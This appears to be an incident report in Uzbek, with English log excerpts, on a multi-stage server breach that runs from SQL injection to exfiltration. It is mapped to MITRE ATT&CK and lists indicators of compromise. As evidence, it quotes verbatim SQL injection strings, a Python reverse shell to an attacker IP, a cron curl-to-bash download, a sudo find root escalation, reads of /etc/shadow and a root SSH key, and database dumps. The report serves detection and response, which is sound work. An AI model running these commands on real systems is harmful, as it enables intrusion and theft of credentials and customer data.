# Hodisa Hisoboti CASE-20260919-01

### Pasport
- **Nomi:** Multi-Stage Server Breach: Web Exploit → Reverse Shell → PrivEsc → Lateral Movement → Exfiltration
- **Holati:** confirmed
- **Xavflilik darajasi (Severity):** CRITICAL
- **Ishonchlilik darajasi:** 98%
- **Jabrlangan hostlar:** `db-prod-02`, `web-prod-01`
- **Foydalanuvchi hisoblari:** `backup_daemon`, `root`, `www-data`
- **Vaqt oralig'i:** 2026-09-18 08:45:00 – 2026-09-18 16:25:16 UTC
- **Manba:** `elasticsearch_export.json`
- **Tahlil qilingan loglar soni:** 15000 ta, aniqlangan hujum zanjiri qadamlari: 22 ta

---

### Qisqacha Xulosa (Executive Summary)
🔴 **TASDIQLANGAN (CRITICAL):** Korporativ infratuzilmaga nisbatan ko'p bosqichli maqsadli kiberhujum amalga oshirilgan. Tashqi IP **198.51.100[.]45** dan boshlangan skanerlash SQL-in'ektsiya, Web Shell yuklash, Cron backdoor o'rnatish, root huquqiga ko'tarilish, SSH kalitini o'g'irlab DB serverga o'tish (Lateral Movement) hamda ma'lumotlar bazasini o'g'irlab tashqi **203.0.113[.]88** serveriga sizdirish (Exfiltration) bilan yakunlangan.

---

### Hujum Zanjiri (Attack Chain UTC)
**1. [2026-09-18 08:45:00 UTC]** — 🟢 `[web-prod-01]` **Reconnaissance:** Attacker scanned 103 sensitive endpoints (/actuator/health, /.git/HEAD, /admin/login.php, /solr/) with 404/403 responses `[T1595.002]`
   > *Hujumchi saytni avtomatik skanerlagan: admin panel, config va backup fayllarini qidirib ko'plab 404/403 javob olgan. Bu razvedka bosqichi — hali kirish yo'q, lekin nishon tanlanmoqda.*
**2. [2026-09-18 10:10:22 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1' OR '1'='1 (Status: 200) `[T1190]`
   > *Veb-ilova parametriga SQL in'ektsiya yuborilgan va baza tuzilmasi, foydalanuvchi jadvali o'qib olingan. Bu — hujumchining tizimga birinchi kirish nuqtasi.*
**3. [2026-09-18 10:12:44 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1 UNION SELECT null,version(),user()-- (Status: 200) `[T1190]`
   > *Veb-ilova parametriga SQL in'ektsiya yuborilgan va baza tuzilmasi, foydalanuvchi jadvali o'qib olingan. Bu — hujumchining tizimga birinchi kirish nuqtasi.*
**4. [2026-09-18 10:14:47 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1 UNION SELECT table_name,null,null FROM information_schema.tables-- (Status: 200) `[T1190]`
   > *Veb-ilova parametriga SQL in'ektsiya yuborilgan va baza tuzilmasi, foydalanuvchi jadvali o'qib olingan. Bu — hujumchining tizimga birinchi kirish nuqtasi.*
**5. [2026-09-18 10:16:21 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1 UNION SELECT username,password_hash,email FROM users WHERE is_admin=1-- (Status: 200) `[T1190]`
   > *Veb-ilova parametriga SQL in'ektsiya yuborilgan va baza tuzilmasi, foydalanuvchi jadvali o'qib olingan. Bu — hujumchining tizimga birinchi kirish nuqtasi.*
**6. [2026-09-18 10:25:00 UTC]** — 🟢 `[web-prod-01]` **Initial Access / Persistence:** POST /api/v1/upload_avatar.php?filename=shell_assets.php (Status: 200) `[T1505.003]`
   > *Serverga web-shell (brauzer orqali buyruq bajaradigan fayl) yuklangan va unga murojaat qilingan. Endi hujumchi veb-server huquqida istalgan buyruqni bajara oladi.*
**7. [2026-09-18 11:00:36 UTC]** — 🟢 `[web-prod-01]` **Discovery:** whoami `[T1033]`
   > *Hujumchi web-shell orqali `whoami`/`id` kabi buyruqlar bilan qaysi huquqda ishlayotganini aniqlagan. Bu — muhitni o'rganish, keyingi qadamni rejalashtirish.*
**8. [2026-09-18 11:03:07 UTC]** — 🟢 `[web-prod-01]` **Discovery:** id `[T1033]`
   > *Hujumchi web-shell orqali `whoami`/`id` kabi buyruqlar bilan qaysi huquqda ishlayotganini aniqlagan. Bu — muhitni o'rganish, keyingi qadamni rejalashtirish.*
**9. [2026-09-18 11:06:19 UTC]** — 🟢 `[web-prod-01]` **Discovery:** uname -a `[T1033]`
   > *Hujumchi web-shell orqali `whoami`/`id` kabi buyruqlar bilan qaysi huquqda ishlayotganini aniqlagan. Bu — muhitni o'rganish, keyingi qadamni rejalashtirish.*
**10. [2026-09-18 11:09:29 UTC]** — 🟢 `[web-prod-01]` **Execution / C2:** python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.45",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' `[T1059.006]`
   > *Python orqali teskari qobiq (reverse shell) ochilgan: server o'zi hujumchining IP siga ulanib, to'liq interaktiv terminal bergan. Ulanish chiquvchi bo'lgani uchun oddiy firewall uni to'smaydi.*
**11. [2026-09-18 11:15:20 UTC]** — 🟢 `[web-prod-01]` **Persistence:** crontab -l `[T1053.003]`
   > *Cron jadvaliga har 15 daqiqada tashqi skriptni yuklab ishga tushiruvchi yozuv qo'shilgan. Bu — qayta ishga tushgandan keyin ham kirishni saqlash usuli; cron yozuvi o'chirilmasa, server qayta zararlanadi.*
**12. [2026-09-18 11:18:22 UTC]** — 🟢 `[web-prod-01]` **Persistence:** echo '*/15 * * * * curl -s http://198.51.100.45/agent.sh | bash' >> /tmp/.cron_backup `[T1053.003]`
   > *Cron jadvaliga har 15 daqiqada tashqi skriptni yuklab ishga tushiruvchi yozuv qo'shilgan. Bu — qayta ishga tushgandan keyin ham kirishni saqlash usuli; cron yozuvi o'chirilmasa, server qayta zararlanadi.*
**13. [2026-09-18 12:49:13 UTC]** — 🟢 `[web-prod-01]` **Privilege Escalation:** sudo /usr/bin/find . -exec /bin/sh -p \; -quit `[T1548.003]`
   > *`sudo` huquqlari ro'yxatlangan va ruxsat etilgan dastur orqali (GTFOBins usuli) root qobig'i olingan. Shu daqiqadan boshlab hujumchi serverda to'liq nazoratga ega.*
**14. [2026-09-18 12:53:15 UTC]** — 🟢 `[web-prod-01]` **Credential Access:** cat /etc/shadow `[T1003.008]`
   > *`/etc/shadow` fayli o'qilgan — barcha lokal parol hashlari hujumchi qo'lida. Parollarni oflayn buzish mumkin, shuning uchun barcha akkaunt parollarini almashtirish shart.*
**15. [2026-09-18 12:57:24 UTC]** — 🟢 `[web-prod-01]` **Credential Access:** cat /root/.ssh/id_rsa `[T1552.004]`
   > *Root foydalanuvchining SSH shaxsiy kaliti o'g'irlangan. Bu kalit bilan parolsiz, boshqa serverlarga ham kirish mumkin — kalitni darhol bekor qilib, yangisini generatsiya qiling.*
**16. [2026-09-18 13:01:17 UTC]** — 🟢 `[web-prod-01]` **Persistence / Account Creation:** useradd -m -s /bin/bash -p '$6$hash$sysadmin' backup_daemon `[T1136.001]`
   > *Yangi lokal foydalanuvchi yaratilgan, nomi tizim akkauntiga o'xshatib tanlangan. Bu — yashirin zaxira kirish yo'li; akkauntni o'chiring va boshqa hostlarda ham shunga o'xshash akkaunt bor-yo'qligini tekshiring.*
**17. [2026-09-18 14:30:36 UTC]** — 🟢 `[web-prod-01]` **Discovery:** nmap -sS -p 22,3306,5432 10.0.2.0/24 `[T1046]`
   > *Ichki tarmoq skanerlangan (SSH, MySQL, PostgreSQL portlari). Hujumchi qo'shni serverlarga o'tish uchun nishon tanlamoqda — demak hujum bitta host bilan tugamaydi.*
**18. [2026-09-18 14:38:36 UTC]** — 🟢 `[web-prod-01]` **Lateral Movement:** Lateral Movement Event: host=web-prod-01 -> target=10.0.2.20:22 cmd="ssh -i /tmp/stolen_id_rsa root@10.0.2.20" `[T1021.004]`
   > *O'g'irlangan SSH kaliti bilan ichki tarmoqdagi boshqa serverga kirilgan. Bu — lateral movement (yon harakat): buzilgan perimetr endi ichki infratuzilmaga tarqalgan.*
**19. [2026-09-18 14:46:31 UTC]** — 🟢 `[db-prod-02]` **Collection:** pg_dump -U postgres -d customer_vault -f /tmp/customers_dump.sql `[T1005]`
   > *Ma'lumotlar bazasi to'liq dump qilingan (mijoz va to'lov jadvallari). Bu hodisaning eng og'ir qismi — shaxsiy ma'lumotlar sizib chiqqan, huquqiy bildirish talab etilishi mumkin.*
**20. [2026-09-18 14:54:40 UTC]** — 🟢 `[db-prod-02]` **Collection:** pg_dump -U postgres -d payment_gateway -f /tmp/payments_dump.sql `[T1005]`
   > *Ma'lumotlar bazasi to'liq dump qilingan (mijoz va to'lov jadvallari). Bu hodisaning eng og'ir qismi — shaxsiy ma'lumotlar sizib chiqqan, huquqiy bildirish talab etilishi mumkin.*
**21. [2026-09-18 16:17:00 UTC]** — 🟢 `[db-prod-02]` **Collection / Staging:** tar -czf /tmp/vault_backup.tar.gz /tmp/*.sql `[T1560.001]`
   > *O'g'irlangan fayllar bitta arxivga yig'ilgan (staging). Bu odatda tashqariga jo'natishdan oldingi oxirgi tayyorgarlik qadami.*
**22. [2026-09-18 16:25:16 UTC]** — 🟢 `[web-prod-01]` **Exfiltration:** Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88 `[T1048]`
   > *Ma'lumotlar tashqi IP ga HTTPS orqali davriy ravishda jo'natilgan. Bu — eksfiltratsiya/C2 kanali: shu IP ni firewallda bloklang va jo'natilgan hajmni aniqlang.*

---

### MITRE ATT&CK Xaritasi
- **T1595.002 — Active Scanning: Vulnerability Scanning** — 🟢 TASDIQLANGAN: Attacker scanned 103 sensitive endpoints (/actuator/health, /.git/HEAD, /admin/login.php, /solr/) with 404/403
- **T1190 — Exploit Public-Facing Application (SQLi)** — 🟢 TASDIQLANGAN: GET /api/v1/products?id=1' OR '1'='1 (Status: 200)
- **T1505.003 — Server Software Component: Web Shell** — 🟢 TASDIQLANGAN: POST /api/v1/upload_avatar.php?filename=shell_assets.php (Status: 200)
- **T1033 — System Owner/User Discovery** — 🟢 TASDIQLANGAN: whoami
- **T1059.006 — Command and Scripting Interpreter: Python Reverse Shell** — 🟢 TASDIQLANGAN: python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.45",4444));os.dup2(s.fileno(),0);os.
- **T1053.003 — Scheduled Task/Job: Cron** — 🟢 TASDIQLANGAN: crontab -l
- **T1548.003 — Abuse Elevation Control Mechanism: Sudo Caching / Abuse** — 🟢 TASDIQLANGAN: sudo /usr/bin/find . -exec /bin/sh -p \; -quit
- **T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow** — 🟢 TASDIQLANGAN: cat /etc/shadow
- **T1552.004 — Unsecured Credentials: Private Keys** — 🟢 TASDIQLANGAN: cat /root/.ssh/id_rsa
- **T1136.001 — Create Account: Local Account** — 🟢 TASDIQLANGAN: useradd -m -s /bin/bash -p '$6$hash$sysadmin' backup_daemon
- **T1046 — Network Service Discovery** — 🟢 TASDIQLANGAN: nmap -sS -p 22,3306,5432 10.0.2.0/24
- **T1021.004 — Remote Services: SSH** — 🟢 TASDIQLANGAN: Lateral Movement Event: host=web-prod-01 -> target=10.0.2.20:22 cmd="ssh -i /tmp/stolen_id_rsa root@10.0.2.20"
- **T1005 — Data from Local System / Database Dump** — 🟢 TASDIQLANGAN: pg_dump -U postgres -d customer_vault -f /tmp/customers_dump.sql
- **T1560.001 — Archive Collected Data: Archive via Utility** — 🟢 TASDIQLANGAN: tar -czf /tmp/vault_backup.tar.gz /tmp/*.sql
- **T1048 — Exfiltration Over Alternative Protocol** — 🟢 TASDIQLANGAN: Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88

---

### IOC va Artefaktlar
- **`198.51.100[.]45`** `[IPv4]` — Attacker / C2: Initial scanner, SQLi source, and reverse shell listener
- **`203.0.113[.]88`** `[IPv4]` — Exfiltration Destination: Destination for high-volume database archive outbound POST
- **`198.51.100.45`** `[src_ip]` — Reconnaissance: Observed in T1595.002 (web-prod-01)
- **`103`** `[probe_count]` — Reconnaissance: Observed in T1595.002 (web-prod-01)
- **`['/actuator/health', '/.git/HEAD', '/admin/login.php', '/solr/', '/wp-admin']`** `[probed_paths]` — Reconnaissance: Observed in T1595.002 (web-prod-01)
- **`/api/v1/products`** `[path]` — Initial Access: Observed in T1190 (web-prod-01)
- **`/api/v1/upload_avatar.php?filename=shell_assets.php`** `[uri]` — Initial Access / Persistence: Observed in T1505.003 (web-prod-01)
- **`php-fpm`** `[parent]` — Discovery: Observed in T1033 (web-prod-01)
- **`198.51.100.45`** `[attacker_ip]` — Execution / C2: Observed in T1059.006 (web-prod-01)
- **`4444`** `[port]` — Execution / C2: Observed in T1059.006 (web-prod-01)
- **`/etc/shadow`** `[target_file]` — Credential Access: Observed in T1003.008 (web-prod-01)
- **`/root/.ssh/id_rsa`** `[target_key]` — Credential Access: Observed in T1552.004 (web-prod-01)
- **`backup_daemon`** `[created_user]` — Persistence / Account Creation: Observed in T1136.001 (web-prod-01)
- **`web-prod-01`** `[source_host]` — Lateral Movement: Observed in T1021.004 (web-prod-01)
- **`10.0.2.20:22`** `[target]` — Lateral Movement: Observed in T1021.004 (web-prod-01)
- **`/tmp/stolen_id_rsa`** `[key]` — Lateral Movement: Observed in T1021.004 (web-prod-01)
- **`/tmp/vault_backup.tar.gz`** `[archive_file]` — Collection / Staging: Observed in T1560.001 (db-prod-02)
- **`203.0.113.88`** `[dst_ip]` — Exfiltration: Observed in T1048 (web-prod-01)
- **`443`** `[port]` — Exfiltration: Observed in T1048 (web-prod-01)
- **`Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88`** `[alert]` — Exfiltration: Observed in T1048 (web-prod-01)
- **`backup_daemon`** `[Account]` — Backdoor Account: User account leveraged during attack
- **`root`** `[Account]` — Compromised Account: User account leveraged during attack
- **`www-data`** `[Account]` — Compromised Account: User account leveraged during attack
